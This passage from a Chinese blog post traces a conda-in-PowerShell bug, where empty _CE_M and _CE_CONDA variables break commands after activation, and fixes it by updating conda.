‘upgrade’)</p><p>conda读取到的cmd是空字符串<code>&#39;&#39;</code></p><p>既然是activate后出现的问题, 那看看conda activate base 到底做了什么</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><br>/<span class="hljs-string">System32</span>&gt; <span class="hljs-built_in">get-command</span> <span class="hljs-string">conda</span><br><br><span class="hljs-string">CommandType</span>     <span class="hljs-string">Name</span>                                               <span class="hljs-string">Version</span>    <span class="hljs-string">Source</span><br>-----------     ----                                               -------    ------<br><span class="hljs-string">Alias</span>           <span class="hljs-string">conda</span> -&gt; <span class="hljs-string">Invoke-Conda</span>                              <span class="hljs-string">0</span>.<span class="hljs-string">0</span>        <span class="hljs-string">Conda</span><br><br>/<span class="hljs-string">System32</span>&gt; (<span class="hljs-built_in">get-command</span> <span class="hljs-string">Invoke-Conda</span>).<span class="hljs-string">Definition</span><br></code></pre></td></tr></table></figure><figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><br><span class="hljs-comment"># Don&#x27;t use any explicit args here, we&#x27;ll use $args and tab completion</span><br><span class="hljs-comment"># so that we can capture everything, INCLUDING short options (e.g. -n).</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$Args</span>.Count <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment"># No args, just call the underlying conda executable.</span><br>    &amp; <span class="hljs-variable">$Env:CONDA_EXE</span> <span class="hljs-variable">$Env:_CE_M</span> <span class="hljs-variable">$Env:_CE_CONDA</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$Command</span> = <span class="hljs-variable">$Args</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Args</span>.Count <span class="hljs-operator">-ge</span> <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$OtherArgs</span> = <span class="hljs-variable">$Args</span>[<span class="hljs-number">1</span><span class="hljs-type">..</span>(<span class="hljs-variable">$Args</span><span class="hljs-type">.Count</span> - <span class="hljs-number">1</span>)];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$OtherArgs</span> = <span class="hljs-selector-tag">@</span>();<br>    &#125;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$Command</span>) &#123;<br>        <span class="hljs-string">&quot;activate&quot;</span> &#123;<br>            <span class="hljs-built_in">Enter-CondaEnvironment</span> @OtherArgs;<br>        &#125;<br>        <span class="hljs-string">&quot;deactivate&quot;</span> &#123;<br>            <span class="hljs-built_in">Exit-CondaEnvironment</span>;<br>        &#125;<br><br>        default &#123;<br>            <span class="hljs-comment"># There may be a command we don&#x27;t know want to handle</span><br>            <span class="hljs-comment"># differently in the shell wrapper, pass it through</span><br>            <span class="hljs-comment"># verbatim.</span><br>            &amp; <span class="hljs-variable">$Env:CONDA_EXE</span> <span class="hljs-variable">$Env:_CE_M</span> <span class="hljs-variable">$Env:_CE_CONDA</span> <span class="hljs-variable">$Command</span> @OtherArgs;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实际上执行的是<code>Enter-CondaEnvironment base</code></p><p>&#x2F;System32&gt; (get-command enter-condaEnvironment).Definition</p><figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br><span class="hljs-keyword">param</span>(<br>    [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">switch</span>]<span class="hljs-variable">$Stack</span>,<br>    [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span>=<span class="hljs-number">0</span>)][<span class="hljs-built_in">string</span>]<span class="hljs-variable">$Name</span><br>);<br><br><span class="hljs-keyword">begin</span> &#123;<br>    <span class="hljs-keyword">If</span> (<span class="hljs-variable">$Stack</span>) &#123;<br>        <span class="hljs-variable">$activateCommand</span> = (&amp; <span class="hljs-variable">$Env:CONDA_EXE</span> <span class="hljs-variable">$Env:_CE_M</span> <span class="hljs-variable">$Env:_CE_CONDA</span> shell.powershell activate <span class="hljs-literal">--stack</span> <span class="hljs-variable">$Name</span> | <span class="hljs-built_in">Out-String</span>);<br>    &#125; <span class="hljs-keyword">Else</span> &#123;<br>        <span class="hljs-variable">$activateCommand</span> = (&amp; <span class="hljs-variable">$Env:CONDA_EXE</span> <span class="hljs-variable">$Env:_CE_M</span> <span class="hljs-variable">$Env:_CE_CONDA</span> shell.powershell activate <span class="hljs-variable">$Name</span> | <span class="hljs-built_in">Out-String</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;[conda shell.powershell activate <span class="hljs-variable">$Name</span>]`n<span class="hljs-variable">$activateCommand</span>&quot;</span>;<br>    <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-literal">-Command</span> <span class="hljs-variable">$activateCommand</span>;<br>&#125;<br><br><span class="hljs-keyword">process</span> &#123;&#125;<br><br><span class="hljs-keyword">end</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>执行的是<code>&amp; $Env:CONDA_EXE $Env:_CE_M $Env:_CE_CONDA shell.powershell activate $Name | Out-String</code>的输出<br>把环境变量临时变为空后执行<code>&amp;  E:\anaconda3\Scripts\conda.exe shell.powershell activate base | out-string</code><br>得到</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">$Env:PATH <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\a</span>naconda3;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\L</span>ibrary<span class="hljs-char escape_">\m</span>ingw-w64<span class="hljs-char escape_">\b</span>in;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\L</span>ibrary<span class="hljs-char escape_">\u</span>sr<span class="hljs-char escape_">\b</span>in;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\L</span>ibrary<span class="hljs-char escape_">\b</span>in;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\S</span>cripts;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\b</span>in;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\c</span>ondabin;.&quot;</span><br>$Env:CONDA_PREFIX <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\a</span>naconda3&quot;</span><br>$Env:CONDA_SHLVL <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1&quot;</span><br>$Env:CONDA_DEFAULT_ENV <span class="hljs-operator">=</span> <span class="hljs-string">&quot;base&quot;</span><br>$Env:CONDA_PROMPT_MODIFIER <span class="hljs-operator">=</span> <span class="hljs-string">&quot;(base) &quot;</span><br>$Env:CONDA_EXE <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\S</span>cripts<span class="hljs-char escape_">\c</span>onda.exe&quot;</span><br>$Env:_CE_M <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>$Env:_CE_CONDA <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>$Env:CONDA_PYTHON_EXE <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\p</span>ython.exe&quot;</span><br>. <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\a</span>naconda3<span class="hljs-char escape_">\e</span>tc<span class="hljs-char escape_">\c</span>onda<span class="hljs-char escape_">\a</span>ctivate.d<span class="hljs-char escape_">\o</span>penssl_activate.ps1&quot;</span><br></code></pre></td></tr></table></figure><p>注意这里设置了这两个环境变量</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$Env</span><span class="hljs-symbol">:_CE_M</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-variable">$Env</span><span class="hljs-symbol">:_CE_CONDA</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>此时执行conda env list便报错了<br>实际执行的命令是:<br>&amp; $Env:CONDA_EXE $Env:_CE_M $Env:_CE_CONDA env list;</p><p>由于<code>$Env:_CE_M</code> <code>$Env:_CE_CONDA</code>二者均是<code>&#39;&#39;</code>, conda 把’’当做是command, 从而报错.</p><p>&amp; $Env:CONDA_EXE ‘’ ‘’ env list;<br>usage: conda-script.py [-h] [-v] [–no-plugins] [-V] COMMAND …<br>conda-script.py: error: argument COMMAND: invalid choice: ‘’ (choose from ‘activate’, ‘clean’, ‘commands’, ‘compare’, ‘config’, ‘create’, ‘deactivate’, ‘env’, ‘export’, ‘info’, ‘init’, ‘install’, ‘list’, ‘notices’, ‘package’, ‘build’, ‘content-trust’, ‘convert’, ‘debug’, ‘develop’, ‘doctor’, ‘index’, ‘inspect’, ‘metapackage’, ‘render’, ‘repoquery’, ‘skeleton’, ‘repo’, ‘pack’, ‘token’, ‘server’, ‘remove’, ‘uninstall’, ‘rename’, ‘run’, ‘search’, ‘update’, ‘upgrade’)</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li>修改<code>$Env:_CONDA_ROOT\shell\condabin\Conda.psm1</code>中定义的Invoke-Conda函数，删掉执行的命令中的$Env:_CE_M $Env:_CE_CONDA</li></ol><p>但是不知道这两个环境变量本来有什么用，删除可能会有未知的影响</p><p>写到这里的时候google了一下这两个环境变量，直接就搜出了conda项目的两个同样的issue…<br><a href="https://github.com/conda/conda/issues/14237">#14237</a><br><a href="https://github.com/conda/conda/issues/14292">#14292</a><br>看来bing还是不行啊，搜了半天啥也没搜到</p><p>有人指出是pwsh之前的版本<code>&#39;&#39; -eq $null</code>是True, 所以conda ‘’ ‘’ env list能正常工作<br>但是7.5.0后是False，所以不行了。</p><p>所以算是conda没跟上pwsh产生的一个bug，2024年就修复了, 更新conda即可 <code>conda install conda=25.5.0</code><br><img src="/blogs/windows/anaconda%E6%BF%80%E6%B4%BB%E7%8E%AF%E5%A2%83%E5%90%8E%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/conda_bug_fix.png" alt="alt text"><br><img src="/blogs/windows/anaconda%E6%BF%80%E6%B4%BB%E7%8E%AF%E5%A2%83%E5%90%8E%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/conda_bug_fix.png1.png" alt="alt text"></p><p>最新版conda源码中没有context.dev时，$Env:_CE_M改成了$null</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hook_preamble</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">if</span> context.dev:<br>        <span class="hljs-keyword">return</span> dedent(<br>            <span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">            $Env:PYTHONPATH = &quot;<span class="hljs-subst">&#123;CONDA_SOURCE_ROOT&#125;</span>&quot;</span><br><span class="hljs-string">            $Env:CONDA_EXE = &quot;<span class="hljs-subst">&#123;sys.executable&#125;</span>&quot;</span><br><span class="hljs-string">            $Env:_CE_M = &quot;-m&quot;</span><br><span class="hljs-string">            $Env:_CE_CONDA = &quot;conda&quot;</span><br><span class="hljs-string">            $Env:_CONDA_ROOT = &quot;<span class="hljs-subst">&#123;CONDA_PACKAGE_ROOT&#125;</span>&quot;</span><br><span class="hljs-string">            $Env:_CONDA_EXE = &quot;<span class="hljs-subst">&#123;context.conda_exe&#125;</span>&quot;</span><br><span class="hljs-string">            $CondaModuleArgs = @&#123;&#123;ChangePs1 = $<span class="hljs-subst">&#123;context.changeps1&#125;</span>&#125;&#125;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>        ).strip()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> dedent(<br>            <span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">            $Env:CONDA_EXE = &quot;<span class="hljs-subst">&#123;context.conda_exe&#125;</span>&quot;</span><br><span class="hljs-string">            $Env:_CE_M = $null</span><br><span class="hljs-string">            $Env:_CE_CONDA = $null</span><br><span class="hljs-string">            $Env:_CONDA_ROOT = &quot;<span class="hljs-subst">&#123;context.conda_prefix&#125;</span>&quot;</span><br><span class="hljs-string">            $Env:_CONDA_EXE = &quot;<span class="hljs-subst">&#123;context.conda_exe&#125;</span>&quot;</span><br><span class="hljs-string">            $CondaModuleArgs = @&#123;&#123;ChangePs1 = $<span class="hljs-subst">&#123;context.changeps1&#125;</span>&#125;&#125;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>        ).strip()<br></code></pre></td></tr></table></figure><h2 id="体会"><a href="#体会" class="headerlink" title="体会"></a>体会</h2><p>善用搜索引擎啊</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
